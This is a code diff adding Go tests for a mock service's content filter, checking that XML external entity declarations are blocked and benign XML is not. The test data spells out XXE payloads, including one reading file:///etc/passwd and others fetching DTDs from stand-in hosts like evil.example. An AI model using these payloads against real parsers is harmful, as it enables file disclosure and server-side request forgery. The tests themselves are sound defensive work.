@@ -292,3 +292,40 @@ func TestOAuthClientMetadataPatternAllowsLegitLookalikes(t *testing.T) {
 		}
 	}
 }
+
+// An XML external entity declaration turns the mock into an XXE payload host:
+// a victim's XML parser fetching the mock dereferences the creator's URL or
+// file. Found on prod aimed at third-party link-preview fetchers (Nov 2026).
+func TestXMLExternalEntityPatternBlocksAbuse(t *testing.T) {
+	f := defaultFilter(t)
+	abuse := []string{
+		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY probe SYSTEM "https://quickmock.dev/m/x">]><root>&probe;</root>`,
+		`<!DOCTYPE rss [<!ENTITY ext SYSTEM "https://webhook.site/abc">]><rss/>`,
+		"<!DOCTYPE svg [\n  <!ENTITY   xxe\tSYSTEM 'file:///etc/passwd'>\n]><svg/>",
+		`<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://evil.example/x.dtd"> %dtd;]><r/>`,
+		`<!doctype r [<!entity pub public "-//X//EN" "http://evil.example/p">]><r/>`,
+	}
+	for _, s := range abuse {
+		in := model.MockInput{ResponseBody: s}
+		if !f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("expected XML external entity to be blocked: %q", s)
+		}
+	}
+}
+
+func TestXMLExternalEntityPatternAllowsLegitLookalikes(t *testing.T) {
+	f := defaultFilter(t)
+	legit := []string{
+		// Internal entities and plain DTD references are ordinary XML.
+		`<!DOCTYPE note [<!ENTITY company "Acme Inc">]><note>&company;</note>`,
+		`<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html/>`,
+		`<?xml version="1.0"?><rss version="2.0"><channel><title>SYSTEM status</title></channel></rss>`,
+		`{"error": "ENTITY SYSTEM unavailable"}`,
+	}
+	for _, s := range legit {
+		in := model.MockInput{ResponseBody: s}
+		if f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("false positive on: %q", s)
+		}
+	}
+}
